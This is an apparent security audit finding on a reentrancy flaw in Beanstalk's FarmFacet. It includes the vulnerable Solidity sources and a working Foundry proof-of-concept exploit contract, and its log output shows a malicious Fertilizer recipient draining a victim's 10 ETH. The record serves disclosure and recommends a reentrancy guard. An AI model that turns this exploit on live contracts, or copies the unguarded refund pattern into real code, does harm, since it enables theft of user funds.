{
  "Title": "`FarmFacet` functions are susceptible to the draining of intermediate value sent by the caller via reentrancy when execution is handed off to an untrusted external contract",
  "Content": "**Description:** The `FarmFacet` enables multiple Beanstalk functions to be called in a single transaction using Farm calls. Any function stored in Beanstalk's EIP-2535 DiamondStorage can be called as a Farm call and, similar to the Pipeline calls originated in the `DepotFacet`, advanced Farm calls can be made within `FarmFacet` utilizing the \"clipboard\" encoding [documented](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/LibFunction.sol#L49-L74) in `LibFunction`.\n\nBoth [`FarmFacet::farm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L35-L45) and [`FarmFacet::advancedFarm`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L53-L63) make use of the [`withEth` modifier](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/FarmFacet.sol#L100-L107) defined as follows:\n\n```solidity\n// signals to Beanstalk functions that they should not refund Eth\n// at the end of the function because the function is wrapped in a Farm function\nmodifier withEth() {\n    if (msg.value > 0) s.isFarm = 2;\n    _;\n    if (msg.value > 0) {\n       s.isFarm = 1;\n        LibEth.refundEth();\n    }\n}\n```\nUsed in conjunction with [`LibEth::refundEth`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Token/LibEth.sol#L16-L26), within the `DepotFacet`, for example, the call is identified as originating from the `FarmFacet` if `s.isFarm == 2`. This indicates that an ETH refund should occur at the end of top-level FarmFacet function call rather than intermediate Farm calls within Beanstalk so that the value can be utilized in subsequent calls.\n\n```solidity\nfunction refundEth()\n    internal\n{\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    if (address(this).balance > 0 && s.isFarm != 2) {\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\n            new bytes(0)\n        );\n        require(success, \"Eth transfer Failed.\");\n    }\n}\n```\n\nSimilar to the vulnerabilities in `DepotFacet` and `Pipeline`, `FarmFacet` Farm functions are also susceptible to the draining of intermediate value sent by the caller via reentrancy by an untrusted and malicious external contract. In this case, the attacker could be the recipient of Beanstalk Fertilizer, for example, given this is a likely candidate for an action that may be performed via `FarmFacet` functions, utilizing [`TokenSupportFacet::transferERC1155`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/farm/TokenSupportFacet.sol#L85-L92), and because transfers of these tokens are performed \"safely\" by calling [`Fertilizer1155:__doSafeTransferAcceptanceCheck`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/tokens/Fertilizer/Fertilizer1155.sol#L42) which in turn calls the `IERC1155ReceiverUpgradeable::onERC1155Received` hook on the Fertilizer recipient.\n\nContinuing the above example, a malicious recipient could call back into the `FarmFacet` and re-enter the Farm functions via the `Fertilizer1155` safe transfer acceptance check with empty calldata and only `1 wei` of payable value. This causes the execution of the attacker's transaction to fall straight through to the refund logic, given no loop iterations occur on the empty data and the conditional blocks within the modifier are entered due to the (ever so slightly) non-zero `msg.value`. The call to `LibEth::refundEth` will succeed since`s.isFarm == 1` in the attacker's context, sending the entire Diamond proxy balance. When execution continues in the context of the original caller's Farm call, it will still enter the conditional since their `msg.value` was also non-zero; however, there is no longer any ETH balance to refund, so this call will fall through without sending any value as the conditional block is not entered.\n\n**Impact:** A malicious external contract handed control of execution during the lifetime of a Farm call can reenter and steal intermediate user funds. As such, this finding is determined to be of **HIGH** severity.\n\n**Proof of Concept:** The following forge test demonstrates the ability of a Fertilizer recipient, for example, to re-enter Beanstalk, draining funds remaining in the Diamond that should have been refunded to the original caller at the end of execution:\n\n```solidity\ncontract FertilizerRecipient {\n    bool exploited;\n\n    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {\n        console.log(\"entered exploiter onERC1155Received\");\n        if (!exploited) {\n            exploited = true;\n            console.log(\"exploiting farm facet farm call\");\n            AdvancedFarmCall[] memory data = new AdvancedFarmCall[](0);\n            IBeanstalk(BEANSTALK).advancedFarm{value: 1 wei}(data);\n            console.log(\"finished exploiting farm facet farm call\");\n        }\n        return bytes4(0xf23a6e61);\n    }\n\n    fallback() external payable {\n        console.log(\"entered exploiter fallback\");\n        console.log(\"Beanstalk balance: \", BEANSTALK.balance);\n        console.log(\"Exploiter balance: \", address(this).balance);\n    }\n}\n\ncontract FarmFacetPoC is Test {\n    uint256 constant TOKEN_ID = 3445713;\n    address constant VICTIM = address(0x995D1e4e2807Ef2A8d7614B607A89be096313916);\n    FertilizerRecipient exploiter;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", ATTACK_BLOCK);\n\n        FarmFacet farmFacet = new FarmFacet();\n        vm.etch(FARM_FACET, address(farmFacet).code);\n\n        Fertilizer fert = new Fertilizer();\n        vm.etch(FERTILIZER, address(fert).code);\n\n        assertGe(IERC1155(FERTILIZER).balanceOf(VICTIM, TOKEN_ID), 1, \"Victim does not have token\");\n\n        exploiter = new FertilizerRecipient();\n        vm.deal(address(exploiter), 1 wei);\n\n        vm.label(VICTIM, \"VICTIM\");\n        vm.deal(VICTIM, 10 ether);\n\n        vm.label(BEANSTALK, \"Beanstalk Diamond\");\n        vm.label(FERTILIZER, \"Fertilizer\");\n        vm.label(address(exploiter), \"Exploiter\");\n    }\n\n    function test_attack() public {\n        emit log_named_uint(\"VICTIM balance before: \", VICTIM.balance);\n        emit log_named_uint(\"BEANSTALK balance before: \", BEANSTALK.balance);\n        emit log_named_uint(\"Exploiter balance before: \", address(exploiter).balance);\n\n        vm.startPrank(VICTIM);\n        // approve Beanstalk to transfer Fertilizer\n        IERC1155(FERTILIZER).setApprovalForAll(BEANSTALK, true);\n\n        // encode call to `TokenSupportFacet::transferERC1155`\n        bytes4 selector = 0x0a7e880c;\n        assertEq(IBeanstalk(BEANSTALK).facetAddress(selector), address(0x5e15667Bf3EEeE15889F7A2D1BB423490afCb527), \"Incorrect facet address/invalid function\");\n\n        AdvancedFarmCall[] memory data = new AdvancedFarmCall[](1);\n        data[0] = AdvancedFarmCall(abi.encodeWithSelector(selector, address(FERTILIZER), address(exploiter), TOKEN_ID, 1), abi.encodePacked(bytes1(0x00)));\n        IBeanstalk(BEANSTALK).advancedFarm{value: 10 ether}(data);\n        vm.stopPrank();\n\n        emit log_named_uint(\"VICTIM balance after: \", VICTIM.balance);\n        emit log_named_uint(\"BEANSTALK balance after: \", BEANSTALK.balance);\n        emit log_named_uint(\"Exploiter balance after: \", address(exploiter).balance);\n    }\n}\n```\n\nAs can be seen in the output below, the exploiter is able to steal the excess 10 Ether sent by the victim:\n\n```\nRunning 1 test for test/FarmFacetPoC.t.sol:FarmFacetPoC\n[PASS] test_attack() (gas: 183060)\nLogs:\n  VICTIM balance before: : 10000000000000000000\n  BEANSTALK balance before: : 0\n  Exploiter balance before: : 1\n  data.length: 1\n  entered __doSafeTransferAcceptanceCheck\n  to is contract, calling hook\n  entered exploiter onERC1155Received\n  exploiting farm facet farm call\n  data.length: 0\n  entered exploiter fallback\n  Beanstalk balance:  0\n  Exploiter balance:  10000000000000000001\n  finished exploiting farm facet farm call\n  VICTIM balance after: : 0\n  BEANSTALK balance after: : 0\n  Exploiter balance after: : 10000000000000000001\n```\n\n**Recommended Mitigation:** Add a reentrancy guard to `FarmFacet` Farm functions.\n\n\\clearpage",
  "Impact": "HIGH",
  "Source": "",
  "Code": [
    {
      "filename": "protocol/contracts/libraries/LibFunction.sol",
      "content": "/*\n SPDX-License-Identifier: MIT\n*/\n\npragma solidity =0.7.6;\npragma experimental ABIEncoderV2;\n\nimport {LibDiamond} from \"./LibDiamond.sol\";\n\n/**\n * @title Lib Function\n * @author Publius\n **/\n\nlibrary LibFunction {\n    /**\n     * @notice Checks The return value of a any function call for success, if not returns the error returned in `results`\n     * @param success Whether the corresponding function call succeeded\n     * @param result The return data of the corresponding function call\n    **/\n    function checkReturn(bool success, bytes memory result) internal pure {\n        if (!success) {\n            // Next 5 lines from https://ethereum.stackexchange.com/a/83577\n            // Also, used in Uniswap V3 https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/Multicall.sol#L17\n            if (result.length < 68) revert();\n            assembly {\n                result := add(result, 0x04)\n            }\n            revert(abi.decode(result, (string)));\n        }\n    }\n\n    /**\n     * @notice Gets the facet address for a given selector\n     * @param selector The function selector to fetch the facet address for\n     * @dev Fails if no set facet address\n     * @return facet The facet address\n    **/\n    function facetForSelector(bytes4 selector)\n        internal\n        view\n        returns (address facet)\n    {\n        LibDiamond.DiamondStorage storage ds = LibDiamond.diamondStorage();\n        facet = ds.selectorToFacetAndPosition[selector].facetAddress;\n        require(facet != address(0), \"Diamond: Function does not exist\");\n    }\n\n    /** @notice Use a Clipboard on callData to copy return values stored as returnData from any Advanced Calls\n     * that have already been executed and paste them into the callData of the next Advanced Call, in a customizable manner\n     * @param callData The callData bytes of next Advanced Call to paste onto\n     * @param clipboard 0, 1 or n encoded paste operations and encoded ether value if using Pipeline\n     * -------------------------------------------------------------------------------------\n     * Clipboard stores the bytes:\n     * [ Type   | Use Ether Flag*  | Type data      | Ether Value (only if flag == 1)*]\n     * [ 1 byte | 1 byte           | n bytes        | 0 or 32 bytes                   ]\n     * * Use Ether Flag and Ether Value are processed in Pipeline.sol (Not used in Farm). See Pipeline.getEthValue for ussage.\n     * Type: 0x00, 0x01 or 0x002\n     *  - 0x00: 0 Paste Operations (Logic in Pipeline.sol and FarmFacet.sol)\n     *  - 0x01: 1 Paste Operation\n     *  - 0x02: n Paste Operations\n     * Type Data: There are two types with type data: 0x01, 0x02\n     *  Type 1 (0x01): Copy 1 bytes32 from a previous function return value\n     *       [ pasteParams ]\n     *       [ 32 bytes ]\n     *      Note: Should be encoded with ['bytes2', 'uint80', 'uint80', 'uint80']  where the first two bytes are Type and Send Ether Flag if using Pipeline\n     *  Type 2 (0x02): Copy n bytes32 from a previous function return value\n     *       [ Padding      | pasteParams[] ]\n     *       [ 32 bytes     | 32 + 32 * n   ]\n     *        * The first 32 bytes are the length of the array.\n     * -------------------------------------------------------------------------------------\n     * @param returnData A list of return values from previously executed Advanced Calls\n     @return data The function call return datas\n    **/\n    function useClipboard(\n        bytes calldata callData,\n        bytes calldata clipboard,\n        bytes[] memory returnData\n    ) internal pure returns (bytes memory data) {\n        bytes1 typeId = clipboard[0];\n        if (typeId == 0x01) {\n            bytes32 pasteParams = abi.decode(clipboard, (bytes32));\n            data = LibFunction.pasteAdvancedBytes(callData, returnData, pasteParams);\n        } else if (typeId == 0x02) {\n            (, bytes32[] memory pasteParams) = abi.decode(\n                clipboard,\n                (uint256, bytes32[])\n            );\n            data = callData;\n            for (uint256 i; i < pasteParams.length; i++)\n                data = LibFunction.pasteAdvancedBytes(data, returnData, pasteParams[i]);\n        } else {\n            revert(\"Function: Advanced Type not supported\");\n        }\n    }\n\n    /**\n     * @notice Copies 32 bytes from returnData into callData determined by pasteParams\n     * @param callData The callData bytes of the next function call\n     * @param returnData A list of bytes corresponding to return data from previous function calls in the transaction\n     * @param pasteParams Denotes which data should be copied and where it should be pasted\n     * Should be in the following format\n     * [2 bytes | 10 bytes         | 10 bytes  | 10 bytes   ]\n     * [ N/A    | returnDataIndex  | copyIndex | pasteIndex ]\n     * @return pastedData the calldata for the next function call with bytes pasted from returnData\n     **/\n    function pasteAdvancedBytes(\n        bytes memory callData,\n        bytes[] memory returnData,\n        bytes32 pasteParams\n    ) internal pure returns (bytes memory pastedData) {\n        // Shift `pasteParams` right 22 bytes to insolated reduceDataIndex\n        bytes memory copyData = returnData[uint256((pasteParams << 16) >> 176)];\n        pastedData = paste32Bytes(\n            copyData,\n            callData,\n            uint256((pasteParams << 96) >> 176), // Isolate copyIndex\n            uint256((pasteParams << 176) >> 176) // Isolate pasteIndex\n        );\n    }\n\n    /**\n     * @notice Copy 32 Bytes from copyData at copyIndex and paste into pasteData at pasteIndex\n     * @param copyData The data bytes to copy from\n     * @param pasteData The data bytes to paste into\n     * @param copyIndex The index in copyData to copying from\n     * @param pasteIndex The index in pasteData to paste into\n     * @return pastedData The data with the copied with 32 bytes\n    **/\n    function paste32Bytes(\n        bytes memory copyData,\n        bytes memory pasteData,\n        uint256 copyIndex,\n        uint256 pasteIndex\n    ) internal pure returns (bytes memory pastedData) {\n        assembly {\n            mstore(add(pasteData, pasteIndex), mload(add(copyData, copyIndex)))\n        }\n        pastedData = pasteData;\n    }\n}"
    },
    {
      "filename": "protocol/contracts/beanstalk/farm/FarmFacet.sol",
      "content": "/**\n * SPDX-License-Identifier: MIT\n **/\n\npragma solidity ^0.7.6;\npragma experimental ABIEncoderV2;\n\nimport {AppStorage} from \"../AppStorage.sol\";\nimport {LibDiamond} from \"../../libraries/LibDiamond.sol\";\nimport {LibEth} from \"../../libraries/Token/LibEth.sol\";\nimport {LibFunction} from \"../../libraries/LibFunction.sol\";\n\n/**\n * @title Farm Facet\n * @author Beasley, Publius\n * @notice Perform multiple Beanstalk functions calls in a single transaction using Farm calls. \n * Any function stored in Beanstalk's EIP-2535 DiamondStorage can be called as a Farm call. (https://eips.ethereum.org/EIPS/eip-2535)\n **/\n\n// AdvancedFarmCall is a Farm call that can use a Clipboard.\n// See LibFunction.useClipboard for details\nstruct AdvancedFarmCall {\n    bytes callData;\n    bytes clipboard;\n}\n\ncontract FarmFacet {\n    AppStorage internal s;\n\n    /**\n     * @notice Execute multiple Farm calls.\n     * @param data The encoded function data for each of the calls\n     * @return results The return data from each of the calls\n    **/\n    function farm(bytes[] calldata data)\n        external\n        payable\n        withEth\n        returns (bytes[] memory results)\n    {\n        results = new bytes[](data.length);\n        for (uint256 i; i < data.length; ++i) {\n            results[i] = _farm(data[i]);\n        }\n    }\n\n    /**\n     * @notice Execute multiple AdvancedFarmCalls.\n     * @param data The encoded function data for each of the calls to make to this contract\n     * See LibFunction.buildAdvancedCalldata for details on advanced data\n     * @return results The results from each of the calls passed in via data\n    **/\n    function advancedFarm(AdvancedFarmCall[] calldata data)\n        external\n        payable\n        withEth\n        returns (bytes[] memory results)\n    {\n        results = new bytes[](data.length);\n        for (uint256 i = 0; i < data.length; ++i) {\n            results[i] = _advancedFarm(data[i], results);\n        }\n    }\n\n    function _advancedFarm(AdvancedFarmCall calldata data, bytes[] memory returnData)\n        internal\n        returns (bytes memory result)\n    {\n        bytes1 pipeType = data.clipboard[0];\n        // 0x00 -> Static Call - Execute static call\n        // else > Advanced Call - Use clipboard on and execute call\n        if (pipeType == 0x00) {\n            result = _farm(data.callData);\n        } else {\n            result = LibFunction.useClipboard(data.callData, data.clipboard, returnData);\n            _farmMem(result);\n        }\n    }\n\n    // delegatecall a Beanstalk function using calldata data\n    function _farm(bytes calldata data) private returns (bytes memory result) {\n        bytes4 selector; bool success;\n        assembly { selector := calldataload(data.offset) }\n        address facet = LibFunction.facetForSelector(selector);\n        (success, result) = facet.delegatecall(data);\n        LibFunction.checkReturn(success, result);\n    }\n\n    // delegatecall a Beanstalk function using memory data\n    function _farmMem(bytes memory data) private returns (bytes memory result) {\n        bytes4 selector; bool success;\n        assembly { selector := mload(add(data, 32)) }\n        address facet = LibFunction.facetForSelector(selector);\n        (success, result) = facet.delegatecall(data);\n        LibFunction.checkReturn(success, result);\n    }\n\n    // signals to Beanstalk functions that they should not refund Eth \n    // at the end of the function because the function is wrapped in a Farm function\n    modifier withEth() {\n        if (msg.value > 0) s.isFarm = 2;\n        _;\n        if (msg.value > 0) {\n            s.isFarm = 1;\n            LibEth.refundEth();\n        }\n    }\n}"
    },
    {
      "filename": "protocol/contracts/libraries/Token/LibEth.sol",
      "content": "/*\n SPDX-License-Identifier: MIT\n*/\n\npragma solidity ^0.7.6;\npragma experimental ABIEncoderV2;\n\nimport \"../LibAppStorage.sol\";\n\n/**\n * @author Publius\n * @title LibEth\n **/\n\nlibrary LibEth {\n    function refundEth()\n        internal\n    {\n        AppStorage storage s = LibAppStorage.diamondStorage();\n        if (address(this).balance > 0 && s.isFarm != 2) {\n            (bool success, ) = msg.sender.call{value: address(this).balance}(\n                new bytes(0)\n            );\n            require(success, \"Eth transfer Failed.\");\n        }\n    }\n}"
    },
    {
      "filename": "protocol/contracts/beanstalk/farm/TokenSupportFacet.sol",
      "content": "/**\n * SPDX-License-Identifier: MIT\n **/\n\npragma solidity =0.7.6;\npragma experimental ABIEncoderV2;\n\nimport \"@openzeppelin/contracts/drafts/IERC20Permit.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"../../interfaces/IERC4494.sol\";\n\n/**\n * @author Publius\n * @title TokenSupportFacet \n * @notice Permit ERC-20 and ERC-721 tokens and transfer ERC-721 and ERC-1155 tokens.\n * @dev To transfer ERC-20 tokens, use {TokenFacet.transferToken}.\n **/\n\ncontract TokenSupportFacet {\n\n    /**\n     * \n     * ERC-20\n     * \n     */\n\n    /// @notice permitERC20 is wrapper function for permit of ERC20Permit token\n    /// @dev See {IERC20Permit-permit}.\n    function permitERC20(\n        IERC20Permit token,\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public payable {\n        token.permit(owner, spender, value, deadline, v, r, s);\n    }\n\n    /**\n     * \n     * ERC-721\n     * \n    **/\n\n    /**\n     * @notice Execute an ERC-721 token transfer\n     * @dev Wraps {IERC721-safeBatchTransferFrom}.\n    **/\n    function transferERC721(\n        IERC721 token,\n        address to,\n        uint256 id\n    ) external payable {\n        token.safeTransferFrom(msg.sender, to, id);\n    }\n\n    /**\n     * @notice Execute a permit for an ERC-721 token.\n     * @dev See {IERC4494-permit}.\n    **/\n    function permitERC721(\n        IERC4494 token,\n        address spender,\n        uint256 tokenId,\n        uint256 deadline,\n        bytes memory sig\n    ) external payable {\n        token.permit(spender, tokenId, deadline, sig);\n    }\n\n    /**\n     * \n     * ERC-1155\n     * \n    **/\n\n    /**\n     * @notice Execute an ERC-1155 token transfer of a single Id.\n     * @dev Wraps {IERC1155-safeTransferFrom}.\n    **/\n    function transferERC1155(\n        IERC1155 token,\n        address to,\n        uint256 id,\n        uint256 value\n    ) external payable {\n        token.safeTransferFrom(msg.sender, to, id, value, new bytes(0));\n    }\n\n    /**\n     * @notice Execute an ERC-1155 token transfer of multiple Ids.\n     * @dev Wraps {IERC1155-safeBatchTransferFrom}.\n    **/\n    function batchTransferERC1155(\n        IERC1155 token,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata values\n    ) external payable {\n        token.safeBatchTransferFrom(msg.sender, to, ids, values, new bytes(0));\n    }\n}"
    }
  ]
}